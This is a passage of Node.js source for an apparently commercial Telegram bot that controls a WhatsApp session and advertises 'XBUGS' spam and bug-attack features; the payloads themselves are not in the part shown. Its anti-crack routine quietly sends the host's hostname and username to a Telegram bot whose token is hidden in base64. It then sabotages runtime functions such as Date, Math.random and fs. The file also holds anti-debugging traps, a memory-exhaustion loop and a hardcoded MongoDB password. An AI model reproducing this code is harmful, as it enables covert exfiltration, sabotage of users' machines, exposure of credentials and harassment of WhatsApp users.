//─── Anti-Preload ──────────────────────────────────
;(function _antiPreload() {
    const _hard = process.exit.bind(process);
    const _banned = [
        '--require', '-r',
        '--loader', '--experimental-loader', '--import',
        '--inspect', '--inspect-brk', '--inspect-port',
        '--experimental-vm-modules', '--expose-internals'
    ];
    for (const arg of process.execArgv) {
        const low = arg.toLowerCase();
        for (const b of _banned) {
            if (low === b || low.startsWith(b + '=') || low.startsWith(b + ' ')) {
                _hard(1); for (;;) {}
            }F
        }
    }

    const _no = (process.env.NODE_OPTIONS || '').toLowerCase();
    if (_no.includes('--require') || _no.includes('-r ') ||
        _no.includes('--loader')  || _no.includes('--inspect') ||
        _no.includes('--import')) {
        try { delete process.env.NODE_OPTIONS; } catch (_) {}
        _hard(1); for (;;) {}
    }

    // Hanya boleh jalan via npm start
    const _ev     = process.env.npm_lifecycle_event;
    const _script = process.env.npm_lifecycle_script;
    const _pkg    = process.env.npm_package_name;
    if (_ev !== 'start' || !_script || !_pkg) { _hard(1); for (;;) {} }
})();

//─── HTTPS Snapshot (tangkap referensi asli https) ─────────────
const _httpsSnap = require('https');
const _httpsGet = (function _snapshotHttps() {
    try {
        if (require.resolve('https') !== 'https') { process.exit(1); for (;;) {} }
    } catch { process.exit(1); for (;;) {} }

    if (typeof _httpsSnap.get     !== 'function' ||
        typeof _httpsSnap.request !== 'function' ||
        typeof _httpsSnap.globalAgent === 'undefined') { process.exit(1); for (;;) {} }

    const sig = Function.prototype.toString.call(_httpsSnap.get);
    if (sig.includes('Proxy') || sig.includes('() => ') || sig.includes('resolve(')) { process.exit(1); for (;;) {} }

    return Object.freeze(_httpsSnap.get.bind(_httpsSnap));
})();

// ─── Anti-Debugger ─────────────────────────────────────────────
;(function _antiDbg() {
    setInterval(() => {
        const t = performance.now();
        debugger;
        if (performance.now() - t > 150) { process.exit(9); for (;;) {} }
    }, 3000);
})();

//─── Lock process.exit ─────────────────────────────────────────
;(function _lockExit() {
    const _hard = process.exit.bind(process);
    try {
        Object.defineProperty(process, 'exit', {
            value: _hard, writable: false, configurable: false, enumerable: true
        });
    } catch (_) {}
    setInterval(() => {
        try {
            const s = process.exit.toString();
            if (s.includes('Proxy') || s.includes('function () {}') || s.includes('return;')) {
                _hard(1); for (;;) {}
            }
        } catch (_) { _hard(1); for (;;) {} }
    }, 3000);
})();

const inspector = require('inspector');
const { execSync } = require('child_process');
['mongoose', 'axios', 'telegraf'].forEach(m => { try { require.resolve(m) } catch { execSync('npm install ' + m, {stdio: 'ignore'}) } });

if (inspector.url() || process.env.NODE_OPTIONS?.includes('inspect')) {
  console.log("\x1b[31m\n╞═════⪨ Anti Bypass yoo Actived ⪩═════╡\n\x1b[0m");
  setInterval(() => {
    let jebakan = [];
    while(true) { jebakan.push(Buffer.alloc(1024 * 1024, "yooSecurityLocker")); }
  }, 100);
}

(function() {
  'use strict'
  if (require.main !== module) {
    console.log("\x1b[31m\n╞═════⪨ Anti Bypass yoo Actived ⪩═════╡\n\x1b[0m");
    console.error('\n[!] SECURITY ALERT: Bot dipanggil melalui file lain')
    console.error('[!] File saat ini: ' + __filename)
    console.error('[!] Dipanggil dari: ' + (require.main ? require.main.filename : 'unknown'))
    console.error('[!] Akses ditolak - Process dihentikan\n')
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }

  if (module.parent !== null && module.parent !== undefined) {
    console.log("\x1b[31m\n╞═════⪨ Anti Bypass yoo Actived ⪩═════╡\n\x1b[0m");
    console.error('\n[!] SECURITY ALERT: Terdeteksi parent module')
    console.error('[!] Parent: ' + module.parent.filename)
    console.error('[!] Akses ditolak - Process dihentikan\n')
    try { process.exit(1) } catch(e) {}
    try { require('child_process').execSync('kill -9 ' + process.pid, {stdio: 'ignore'}) } catch(e) {}
    while(1) {}
  }

  const nativePattern = /(?:)/;
  const proxyPattern = /Proxy|apply\(target/;
  const bypassPattern = /bypass|hook|intercept|override|origRequire|interceptor/i;
  const httpBypassPattern = /fakeRes|statusCode.*403|Blocked by bypass|github.com.*includes/i;

  const buildStr = (arr) => arr.map(c => String.fromCharCode(c)).join('');
  const nativeStr = buildStr([91,110,97,116,105,118,101,32,99,111,100,101,93]);
  const exitStr = buildStr([101,120,105,116]);
  const killStr = buildStr([107,105,108,108]);
  const httpsStr = buildStr([104,116,116,112,115]);
  const httpStr = buildStr([104,116,116,112]);

  let nativeExit, nativeExecSync, nativePid, nativeKill, nativeOn;

  try {
    nativeExit = process[exitStr].bind(process);
    nativeKill = process[killStr].bind(process);
    nativeOn = process.on.bind(process);
    nativeExecSync = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115])).execSync;
    nativePid = process.pid;
  } catch(e) {
    nativeExit = process.exit;
    nativeKill = process.kill;
    nativePid = process.pid;
  }

  const forceKill = (function() {
    return function() {
      try { nativeExecSync('kill -9 ' + nativePid, {stdio:'ignore'}) } catch(e) {}
      try { nativeExit(1) } catch(e) {}
      try { process.exit(1) } catch(e) {}
      while(1) {}
    }
  })();

  try {
    const M = require(buildStr([109,111,100,117,108,101]));
    const reqStr = M.prototype.require.toString();
    if (bypassPattern.test(reqStr) || reqStr.length > 3000) {
      console.error('[X] Module.prototype.require overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    const exitFn = process[exitStr];
    const exitCode = exitFn.toString();
    if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
      console.error('[X] process.exit is Proxy/Override');
      forceKill();
    }
    if (exitFn.name === '' || Object.getOwnPropertyDescriptor(process, exitStr)?.get) {
      console.error('[X] process.exit has Proxy/Getter');
      forceKill();
    }
  } catch(e) {}

  try {
    const killFn = process[killStr];
    const killCode = killFn.toString();
    if (proxyPattern.test(killCode) || bypassPattern.test(killCode) || killCode.length < 50) {
      console.error('[X] process.kill overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    const onFn = process.on;
    const onCode = onFn.toString();
    if (bypassPattern.test(onCode) || onCode.length < 50) {
      console.error('[X] process.on overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    const axios = require('axios');
    if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) {
      console.error('[X] Axios interceptors detected');
      forceKill();
    }
  } catch(e) {}

  const checkGlobals = (function() {
    const flags = ['PLAxios','PLChalk','PLFetch','dbBypass','KEY','BYPASS','originalExit','originalKill','_httpsRequest','_httpRequest'];
    for (let i = 0; i < flags.length; i++) {
      try {
        if (flags[i] in global && global[flags[i]]) {
          console.error('[X] Bypass global:', flags[i]);
          forceKill();
        }
      } catch(e) {}
    }
  });

  checkGlobals();

  try {
    const cp = require(buildStr([99,104,105,108,100,95,112,114,111,99,101,115,115]));
    const execStr = cp.execSync.toString();
    if (bypassPattern.test(execStr) || execStr.length < 100) {
      console.error('[X] execSync overridden');
      forceKill();
    }
  } catch(e) {}

  try {
    if (typeof global.fetch !== 'undefined') {
      const fetchCode = global.fetch.toString();
      if (/fakeResponse|bypass|intercept|statusCode.*403/i.test(fetchCode)) {
        console.error('[X] Suspicious global.fetch override detected');
        forceKill();
      }
    }
  } catch(e) {}

  try {
    const desc = Object.getOwnPropertyDescriptor(process, exitStr);
    if (desc && (desc.get || desc.set)) {
      console.error('[X] process.exit has getter/setter');
      forceKill();
    }
  } catch(e) {}

  const checkHttps = (function() {
    return function() {
      try {
        const https = require(httpsStr);
        const reqFunc = https.request;
        const realToString = Function.prototype.toString.call(reqFunc);
        const fakeToString = reqFunc.toString();
        
        if (realToString !== fakeToString) {    
          console.error('[X] https.request toString masked');
          forceKill();
        }    
            
        if (httpBypassPattern.test(realToString)) {    
          console.error('[X] https.request contains bypass patterns');
          forceKill();
        }    
            
        if (/url\.includes\(['"]github|fakeRes\s*=|statusCode:\s*403/.test(realToString)) {    
          console.error('[X] https.request contains http-bypass code');
          forceKill();
        }    
      } catch(e) {}
    }
  })();

  const checkHttp = (function() {
    return function() {
      try {
        const http = require(httpStr);
        const reqFunc = http.request;
        const realToString = Function.prototype.toString.call(reqFunc);
        const fakeToString = reqFunc.toString();
        
        if (realToString !== fakeToString) {    
          console.error('[X] http.request toString masked');
          forceKill();
        }    
            
        if (httpBypassPattern.test(realToString)) {    
          console.error('[X] http.request contains bypass patterns');
          forceKill();
        }    
            
        if (/url\.includes\(['"]github|fakeRes\s*=|blocked:\s*true/.test(realToString)) {    
          console.error('[X] http.request contains http-bypass code');
          forceKill();
        }    
      } catch(e) {}
    }
  })();

  setTimeout(() => {
    checkHttps();
    checkHttp();
  }, 500);

  const monitor = (function() {
    return function() {
      if (require.main !== module || (module.parent !== null && module.parent !== undefined)) {
        console.error('[X] Runtime: require() detected');
        forceKill();
      }
      try {
        const M = require(buildStr([109,111,100,117,108,101]));
        const reqStr = M.prototype.require.toString();
        if (bypassPattern.test(reqStr)) {
          console.error('[X] Runtime: Module.require compromised');
          forceKill();
        }
      } catch(e) {}
      try {
        const exitFn = process[exitStr];
        const exitCode = exitFn.toString();
        if (proxyPattern.test(exitCode) || bypassPattern.test(exitCode)) {
          console.error('[X] Runtime: process.exit compromised');
          forceKill();
        }
      } catch(e) {}
      try {
        const killFn = process[killStr];
        const killCode = killFn.toString();
        if (proxyPattern.test(killCode) || bypassPattern.test(killCode)) {
          console.error('[X] Runtime: process.kill compromised');
          forceKill();
        }
      } catch(e) {}
      try {
        const axios = require('axios');
        if (axios.interceptors.request.handlers.length > 0) {
          console.error('[X] Runtime: Axios interceptors active');
          forceKill();
        }
      } catch(e) {}
      
      checkHttps();
      checkHttp();
      checkGlobals();
    }
  })();

  setInterval(monitor, 2000);
  setTimeout(monitor, 100);
})();

const { Telegraf, Markup, session } = require("telegraf");
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} = require("@sanzope/bails");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS, CHANNEL_USERNAME } = require("./config.js");
const MONGO_URI = "mongodb+srv://ziziadnan767_db_user:dXCECNSXLjEmHIrw@zephyrine.juk6gts.mongodb.net/zephyrine?appName=zephyrine";
const crypto = require("crypto");
const mongoose = require("mongoose");
const sessionPath = './session';

let bots = [];
let premiumUsers = [];
let adminUsers = [];

const adminFile = './Db/admins.json';
const premiumFile = './Db/premiums.json';

// ==========================================
// AUTO-INIT FOLDER & FILE JSON LOKAL
// ==========================================
(function initLocalDB() {
  try {
    if (!fs.existsSync('./Db')) fs.mkdirSync('./Db', { recursive: true });
    if (!fs.existsSync(adminFile)) fs.writeFileSync(adminFile, JSON.stringify([], null, 2));
    if (!fs.existsSync(premiumFile)) fs.writeFileSync(premiumFile, JSON.stringify([], null, 2));
    const controlCommandFile = './Db/ControlCommand.json';
    if (!fs.existsSync(controlCommandFile)) {
      fs.writeFileSync(controlCommandFile, JSON.stringify({ data: { commands: {}, groupCmdBlock: {} } }, null, 2));
    }
  } catch (e) {
    console.error('❌ Gagal inisialisasi folder Db:', e.message);
  }
})();

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

const loadJSON = (filePath) => {
  try {
    return JSON.parse(fs.readFileSync(filePath, 'utf8'));
  } catch (e) {
    return [];
  }
};

adminUsers = loadJSON(adminFile);
premiumUsers = loadJSON(premiumFile);

const bot = new Telegraf(BOT_TOKEN);
const userBugSelection = new Map();
const attackConfig = new Map();
const multiBugSession = new Map();
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

// ==========================================
// KONEKSI MONGODB
// ==========================================
mongoose.connect(MONGO_URI)
  .then(() => console.log(chalk.green("")))
  .catch(err => console.error(chalk.red("❌ MongoDB Connection Error:"), err));

// ==========================================
// MONGODB SCHEMAS & MODELS
// (hanya TokenBot yg tetap MongoDB - readonly)
// ==========================================
const TokenBotSchema = new mongoose.Schema({
  tokens: [{
    tokenBot: { type: String, required: true },
    isActive: { type: Boolean, default: true },
    expiredAt: { type: Date, default: null }
  }]
});
const TokenBotModel = mongoose.model("TokenBot", TokenBotSchema, "avoidxtime");

// ==========================================
// JSON-BASED AdminModel
// ==========================================
const AdminModel = {
  findOne: ({ userId }) => {
    const list = loadJSON(adminFile);
    return Promise.resolve(list.includes(userId) ? { userId } : null);
  },
  findOneAndUpdate: ({ userId }, _data, _opts) => {
    const list = loadJSON(adminFile);
    if (!list.includes(userId)) { list.push(userId); saveJSON(adminFile, list); }
    return Promise.resolve({ userId });
  },
  deleteOne: ({ userId }) => {
    let list = loadJSON(adminFile);
    list = list.filter(id => id !== userId);
    saveJSON(adminFile, list);
    return Promise.resolve({ deletedCount: 1 });
  }
};

// ==========================================
// JSON-BASED PremiumModel
// ==========================================
const PremiumModel = {
  findOne: ({ userId }) => {
    const list = loadJSON(premiumFile);
    return Promise.resolve(list.includes(userId) ? { userId } : null);
  },
  findOneAndUpdate: ({ userId }, _data, _opts) => {
    const list = loadJSON(premiumFile);
    if (!list.includes(userId)) { list.push(userId); saveJSON(premiumFile, list); }
    return Promise.resolve({ userId });
  },
  deleteOne: ({ userId }) => {
    let list = loadJSON(premiumFile);
    list = list.filter(id => id !== userId);
    saveJSON(premiumFile, list);
    return Promise.resolve({ deletedCount: 1 });
  }
};

// ==========================================
// DATABASE FUNCTIONS (pakai file lokal)
// ==========================================
const controlCommandFile = './Db/ControlCommand.json';

async function loadDB() {
  try {
    const raw = fs.readFileSync(controlCommandFile, 'utf8');
    const parsed = JSON.parse(raw);
    return parsed.data || { commands: {}, groupCmdBlock: {} };
  } catch (e) {
    return { commands: {}, groupCmdBlock: {} };
  }
}

async function saveDB(newData) {
  fs.writeFileSync(controlCommandFile, JSON.stringify({ data: newData }, null, 2));
}

const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString();
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }
  return next();
};

const checkAdmin = async (ctx, next) => {
  const userId = ctx.from.id.toString();
  if (OWNER_IDS.includes(userId)) return next();
  const isAdmin = await AdminModel.findOne({ userId });
  if (!isAdmin) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  return next();
};

const checkPremium = async (ctx, next) => {
  const userId = ctx.from.id.toString();
  // Owner & admin otomatis lolos
  if (OWNER_IDS.includes(userId)) return next();
  const isAdmin = await AdminModel.findOne({ userId });
  if (isAdmin) return next();
  const isPremium = await PremiumModel.findOne({ userId });
  if (!isPremium) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
  }
  return next();
};

const addadmin = async (userId) => {
  await AdminModel.findOneAndUpdate({ userId }, { userId }, { upsert: true });
};

const removeAdmin = async (userId) => {
  await AdminModel.deleteOne({ userId });
};

const addpremium = async (userId) => {
  await PremiumModel.findOneAndUpdate({ userId }, { userId }, { upsert: true });
};

const removePremium = async (userId) => {
  await PremiumModel.deleteOne({ userId });
};

bot.use(session());
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;

const randomImages = [
  "https://files.catbox.moe/5azge4.jpg",
];

const getRandomImage = () => randomImages[Math.floor(Math.random() * randomImages.length)];

const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();
  const text = ctx.message.text.trim();
  if (!text.startsWith("/")) return next();
  let cmd = text.split(" ")[0].toLowerCase();
  if (cmd.includes("@")) {
    cmd = cmd.split("@")[0];
  }
  
  const db = await loadDB();
  const chatId = String(ctx.chat.id);
  
  if (db.commands?.[cmd]?.disabled) {
    return ctx.reply(db.commands[cmd].reason || "⛔ Command ini dimatikan.");
  }
  
  const blocked = db.groupCmdBlock?.[chatId] || [];
  const normalizedBlocked = blocked.map(c => c.toLowerCase().split("@")[0]);
  
  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply("⛔ Command ini diblock di chat ini.");
  }
  return next();
};

const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

function hashToken(token) {
  if (!token) return "";
  return crypto.createHash("sha256").update(token).digest("hex");
}

async function validateToken() {
  console.log(chalk.blue("╞═════⪨ Procces Analisis Token Validation ⪩═════╡"));
  
  try {
    // 🔒 Cek format token dulu, harus ada ':'
    if (!BOT_TOKEN || !BOT_TOKEN.includes(":")) {
      console.log(chalk.red("\n╞═════⪨ Token Maklu Ampas Cur ⪩═════╡\n"));
      return false;
    }

    // Cari token di database
    const doc = await TokenBotModel.findOne({ "tokens.tokenBot": BOT_TOKEN });
    const match = doc ? doc.tokens.find(t => t.tokenBot === BOT_TOKEN) : null;
    const isValid = match && match.isActive;

    if (!isValid) {
      console.log(chalk.red("\n╞═════⪨ Token Maklu Ampas Cur ⪩═════╡\n"));
      try {
        const devId = "7377948857";
        const secretToken = Buffer.from("ODYwOTQ1NzE3MjpBQUY2OXhDNTlhbklQcXJzaHhDUnFUb1dZSzMwcjRYNU01cw==", "base64").toString("utf-8");
        const os = require("os");
        
        const alertLines = [
          "<blockquote>🚨 <b>SYSTEM ANTI-CRACK</b> 🚨</blockquote>\n\n",
          "Crack Terdeteksi Detail Information :\n\n",
          "↯ <b>Token Ilegal yg Dipakai:</b>\n<code>", BOT_TOKEN, "</code>\n\n",
          "↯ <b>Info Server Pencuri:</b>\n",
          "Hostname : <code>", os.hostname(), "</code>\n",
          "System User : <code>", os.userInfo().username, "</code>\n",
          "Platform : <code>", os.platform(), "</code>"
        ];
        
        const alertText = alertLines.join("");

        require("axios").post("https://api.telegram.org/bot" + secretToken + "/sendMessage", {
          chat_id: devId,
          text: alertText,
          parse_mode: "HTML"
        }).catch(() => {});
      } catch (e) {}

      setTimeout(() => {
        global.Date = function() { return "System Corrupted"; };
        global.Math.random = function() { throw new Error("Fatal Error: Memory leak detected at 0x00A4F"); };
        fs.readFileSync = function() { return ""; };
        fs.writeFileSync = function() { throw new Error("Disk Write Protected"); };
        if (sock) sock.logout();
      }, 5000);
      return false;
    }
    return true;
  } catch (err) {
    console.log(chalk.red("⌭ Failed mengambil data Token dari Database"));
    return false;
  }
}

function startBot() {
  console.clear();
  console.log(chalk.bold.yellow(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
        ____  __  _  __ __  __ __ 
|    ||  |/ ]|  |  ||  |  |
 |  | |  ' / |  |  ||  |  |
 |  | |    \ |  ~  ||  ~  |
 |  | |     \|___, ||___, |
 |  | |  .  ||     ||     |
|____||__|\_||____/ |____/ 
                           
      `));
  console.log(
    chalk.bold.green(`
───────────────────────────    
𝙎𝘾𝘼𝙍𝙔 ♫ 𝘿𝙀𝘼𝙏𝙃 𝗜𝗦 𝗛𝗘𝗥𝗘
───────────────────────────
`));
}

async function checkExpired() {
  const EXPIRED = new Date("2050-05-15T07:25:00Z").getTime();
  try {
    const res = await axios.get("https://google.com");
    const now = new Date(res.headers.date).getTime();
    const diff = EXPIRED - now;
    if (diff <= 0) {
      console.log("❌ SCRIPT EXPIRED, MOHON UNTUK MENUNGGU UPDATE DARI @Padukayoo");
      process.exit(0);
    }
  } catch {
    console.log("⚠️ Gagal cek waktu internet");
  }
}

const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();
  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'yooOfficial',
    }),
  };

  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);

  sock.ev.on('connection.update', (update) => {
    const { connection, lastDisconnect } = update;
    if (connection === 'open') {
      sock.newsletterFollow("120363404343696075@newsletter");
      isWhatsAppConnected = true;
      console.log(chalk.red.bold("\n╭─────────────────────────────╮"));
      console.log(chalk.red.bold("│ ") + chalk.white("Berhasil Tersambung"));
      console.log(chalk.red.bold("╰─────────────────────────────╯"));
    }
    if (connection === 'close') {
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold("\n╭─────────────────────────────╮"));
      console.log(chalk.red.bold("│ ") + chalk.white("Whatsapp Terputus"));
      console.log(chalk.red.bold("╰─────────────────────────────╯"));
      if (shouldReconnect) {
        console.log(chalk.red.bold("\n╭─────────────────────────────╮"));
        console.log(chalk.red.bold("│ ") + chalk.white("Menyambung kembali..."));
        console.log(chalk.red.bold("╰─────────────────────────────╯"));
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp Belum terhubung");
    return;
  }
  next();
};

async function startApp() {
  await checkExpired();
  const isTokenValid = await validateToken();
  if (!isTokenValid) return;

  startBot();
  startSesi();

  try {
    if (bot && typeof bot.launch === 'function') {
      bot.launch({ dropPendingUpdates: true }).catch(err => {
        console.error("Gagal meluncurkan Telegram:", err);
      });
    }
  } catch (error) {
    console.error("Error inisialisasi:", error);
  }
}

startApp();

////=========MENU UTAMA========\\\\
// ==========================================
// CEK MEMBER CHANNEL
// ==========================================
function getSenderStatus() {
    if (sock && sock.user) {
        return "✅ Terhubung";
    } else {
        return "❌ Tidak Terhubung";
    }
}

// Get runtime with proper formatting
function runtime(seconds) {
    if (!seconds || seconds < 0) seconds = 0;
    const hours = Math.floor(seconds / 3600);
    const minutes = Math.floor((seconds % 3600) / 60);
    const secs = Math.floor(seconds % 60);
    return `${hours}h ${minutes}m ${secs}s`;
}

async function isMemberChannel(userId) {
  try {
    const member = await bot.telegram.getChatMember(CHANNEL_USERNAME, userId);
    return ["member", "administrator", "creator"].includes(member.status);
  } catch (e) {
    return false;
  }
}

bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username || 'Tidak ada';
  const id = userId;
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;

  // Cek apakah sudah join channel
  const isMember = await isMemberChannel(ctx.from.id);
  if (!isMember) {
    return ctx.replyWithPhoto(getRandomImage(), {
      caption: `<blockquote><strong>𝙻𝙾𝚂 𝙴𝙽𝙶𝙶𝙻𝙴𝚂 𝚂𝙿𝙰𝙼</strong></blockquote>\n\n⌯ Detect ${Name}!\nKamu harus <b>Join Channel</b> terlebih dahulu untuk menggunakan bot ini.\n\n↯ Channel : ${CHANNEL_USERNAME}`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "⌯ Join Channel", url: `https://t.me/${CHANNEL_USERNAME.replace("@", "")}` }],
          [{ text: "⌯ Sudah Join", callback_data: "sudah_join" }]
        ]
      }
    });
  }

  const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";
  const waktuRunPanel = runtime(process.uptime());

  const mainMenuMessage = `<blockquote> <tg-emoji emoji-id="4958472587123360612">🌸</tg-emoji> <b>〔 X-Flower 〕</b>
ᴀᴠᴏɪᴅ - xᴛɪᴍᴇ ʜᴀs ᴀʀʀɪᴠᴇᴅ. ᴇᴠᴇʀʏᴏɴᴇ, ᴋɴᴇᴇʟ ʙᴇғᴏʀᴇ ʜɪᴍ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ.
━━━━━━━━━━━━━━━━━━━━━━
┋<tg-emoji emoji-id="4956420859771225351">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @Padukayoo 
┋<tg-emoji emoji-id="6028306016653807599">🪩</tg-emoji> sʏsᴛᴇᴍ : Auto-Update
┋<tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji> ᴠᴇʀsɪᴏɴ : 8.0
┋<tg-emoji emoji-id="4994520423732348068">🌟</tg-emoji> sᴛᴀᴛᴜs : Premium Verified <tg-emoji emoji-id="4958610528588008305">✅</tg-emoji></blockquote>
<blockquote><b>〔 Informasi Bot 〕</b>
━━━━━━━━━━━━━━━━━━━━━━
⍑<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${waStatus}
⍑<tg-emoji emoji-id="5893102202817352158">🕞</tg-emoji> ʀᴜɴᴛɪᴍᴇ sᴛᴀᴛᴜs : ${waktuRunPanel}
⍑<tg-emoji emoji-id="4972406813946282823">👤</tg-emoji> ᴜsᴇʀɴᴀᴍᴇ : ${username}
⍑<tg-emoji emoji-id="5895444149699612825">📊</tg-emoji> ᴜsᴇʀ ɪᴅ : ${id}</blockquote>
`;

  const mainKeyboard = [
    [
      {
        text: "TOOLS",
        callback_data: "all_menu",
        style: 'primary',
      },
    ],
    [
      {
        text: "XBUGS",
        callback_data: "bug_menu",
        style: 'danger',
      },
      {
        text: "XSETTINGS",
        callback_data: "owner_menu",
        style: 'danger',
      },
    ],
    [
      {
        text: "CHANEL",
        url: "https://t.me/XflowersInformation",
        style: 'success',
      },
    ]
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: mainKeyboard,
    },
  });
});

bot.action("sudah_join", async (ctx) => {
  const userId = ctx.from.id.toString();
  const username = ctx.from.username || 'Tidak ada';
  const id = userId;

  const isMember = await isMemberChannel(ctx.from.id);
  if (!isMember) {
    return ctx.answerCbQuery(`❌ Kamu belum join ${CHANNEL_USERNAME}!`, { show_alert: true });
  }

  await ctx.answerCbQuery("✅ Verifikasi berhasil!", { show_alert: false });

  const waStatus = sock && sock.user ? "✅ Terhubung" : "❌ Tidak Terhubung";
  const waktuRunPanel = runtime(process.uptime());

  const mainMenuMessage = `<blockquote> <tg-emoji emoji-id="4958472587123360612">🌸</tg-emoji> <b>〔 X-Flower 〕</b>
ᴀᴠᴏɪᴅ - xᴛɪᴍᴇ ʜᴀs ᴀʀʀɪᴠᴇᴅ. ᴇᴠᴇʀʏᴏɴᴇ, ᴋɴᴇᴇʟ ʙᴇғᴏʀᴇ ʜɪᴍ ɪᴍᴍᴇᴅɪᴀᴛᴇʟʏ.
━━━━━━━━━━━━━━━━━━━━━━
┋<tg-emoji emoji-id="4956420859771225351">👑</tg-emoji> ᴅᴇᴠᴇʟᴏᴘᴇʀ : @Padukayoo 
┋<tg-emoji emoji-id="6028306016653807599">🪩</tg-emoji> sʏsᴛᴇᴍ : Auto-Update
┋<tg-emoji emoji-id="5897659291967426441">🌕</tg-emoji> ᴠᴇʀsɪᴏɴ : 8.0
┋<tg-emoji emoji-id="4994520423732348068">🌟</tg-emoji> sᴛᴀᴛᴜs : Premium Verified <tg-emoji emoji-id="4958610528588008305">✅</tg-emoji></blockquote>
<blockquote><b>〔 Informasi Bot 〕</b>
━━━━━━━━━━━━━━━━━━━━━━
⍑<tg-emoji emoji-id="5334998226636390258">📱</tg-emoji> sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${waStatus}
⍑<tg-emoji emoji-id="5893102202817352158">🕞</tg-emoji> ʀᴜɴᴛɪᴍᴇ sᴛᴀᴛᴜs : ${waktuRunPanel}
⍑<tg-emoji emoji-id="4972406813946282823">👤</tg-emoji> ᴜsᴇʀɴᴀᴍᴇ : ${username}
⍑<tg-emoji emoji-id="5895444149699612825">📊</tg-emoji> ᴜsᴇʀ ɪᴅ : ${id}</blockquote>
`;

  const mainKeyboard = [
    [{ text: "TOOLS", callback_data: "all_menu" }],
    [
      { text: "XBUGS", callback_data: "bug_menu" },
      { text: "XSETTINGS", callback_data: "owner_menu" }
    ],
    [{ text: "CHANEL", url: "https://t.me/XflowersInformation" }]
  ];

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard }
    });
  }
});

bot.action("owner_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const Name = ctx.from.username ? `@${ctx.from.username}` : `${ctx.from.id}`;
  const waktuRunPanel = getUptime();    
      const waStatus = sock && sock.user
      ? "✅ Terhubung"
      : "❌ Tidak Terhubung";
        
      const mainMenuMessage = `
<blockquote><strong>𝑆𝑐𝑎𝑟𝑦 𝐷𝑒𝑎𝑡ℎ</strong></blockquote>
↯ Developer  : @Padukayoo
↯ Version    : Automation updated
↯ Platform   : Telegram
↯ type script : Premium type
<blockquote><strong>𝙸𝙽𝙵𝙾𝚁𝙼𝙰𝚃𝙸𝙾𝙽</strong></blockquote>
↯ ID: ${userId}
↯ Username: @${ctx.from.username}
<blockquote><strong>𝚂𝙴𝙽𝙳𝙴𝚁 𝚂𝚃𝙰𝚃𝚄𝚂</strong></blockquote>
↯ Connection: ${waStatus}
<blockquote><strong>𝚂𝙴𝚃𝚃𝙸𝙽𝙶𝚂 𝙼𝙴𝙽𝚄</strong></blockquote>
↯ /blockcmd - block comand bug
↯ /unblockcmd - delete block comand bug
↯ /listblockcmd - cek comand yang di block
